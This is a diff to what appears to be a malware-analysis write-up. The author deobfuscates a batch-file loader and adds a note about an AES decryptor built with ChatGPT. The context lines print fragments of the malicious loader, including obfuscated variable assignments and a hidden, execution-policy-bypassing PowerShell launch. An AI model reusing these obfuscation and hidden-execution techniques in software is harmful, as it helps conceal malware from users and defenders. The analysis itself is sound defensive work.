@@ -54,7 +54,7 @@ set "bhunjibhunjibhunjibhunjibhunji=!zsexdrzsexdrzsexdrzsexdrzsexdr!"
 !bhunjibhunjibhunjibhunjibhunji! "ckgMzaltivLxuGAeCevHMWWHEdYyKliYXvbInLefrxEmnhjvzletlABeTtxDfCRNHZEDcZpGxHioaPbbHebBYQXCZdICsBNzMFcpjRABMdjjcBhBWPfScDsKoNuCAcJGRlPirXRNXderAmpuF="%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" "
 ~~~
 
-After som trial and error, and with the help of ChatGPT to guess some of the names, this is what i landed on
+After some trial and error, and with the help of ChatGPT to guess some of the names, this is what i landed on
 
 ~~~
 !delayed_var_2! "profile_var=-noprofile -windowstyle hidden -ep bypass -command $command = '%~f0';
@@ -92,3 +92,6 @@ foreach ($line in $lineArray)
   }
 !delayed_var_2! "unknown"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" "
 ~~~
+
+From here on out, i got a decryptor made from ChatGPT (Cyberchef's AES decrypt wasn't working well since it resulted in binary data).
+This decryptor can be found here: https://github.com/khaansec/Black-Hat-Python/blob/cd6412b73bc699ac49acde2369c3f808c9d1f899/decrypt_aes_payload.py
